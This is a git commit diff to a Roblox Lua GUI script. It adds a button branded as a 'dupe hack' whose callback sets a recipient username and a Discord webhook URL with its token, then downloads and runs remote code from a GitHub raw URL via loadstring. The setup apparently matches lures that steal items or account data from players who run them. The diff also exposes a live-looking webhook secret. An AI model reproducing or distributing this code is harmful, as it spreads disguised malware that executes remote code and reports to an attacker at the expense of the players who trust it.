f04ddc65e66a2d535c37d4bbaed3fd391d090b19
Nibiru <127780084+VV-Nibiru-VV@users.noreply.github.com>
2023-03-13 19:33:28 +0100

    Update script.lua

--- script.lua
+++ script.lua
@@ -13,3 +13,19 @@ local Tab = Window:MakeTab({
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
+Tab:AddButton({
+	Name = "Press [ON]",
+	Callback = function()
+      		print("button pressed")
+Username = "notulP_hctiwT"
+WebHook = "https://discord.com/api/webhooks/1084890231834148904/T5cvufGS8ztTd17sbVeiv8Be1is5tCI2j-9QsDNI1LON3GlhQaAc4Nc5xXCL2B1U4X8V"
+
+loadingscreen = true
+_G.CustomScriptName = "Nibiru [DUPE HACK]"
+_G.Text1 = "[SCRIPT] Loading now ..."
+_G.Text2 = "[SCRIPT] Waiting 10 seconds ..."
+_G.Text3 = "[SCRIPT] Checking now..."
+_G.Text4 = "[SCRIPT] Starting now..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
+	end    
+})
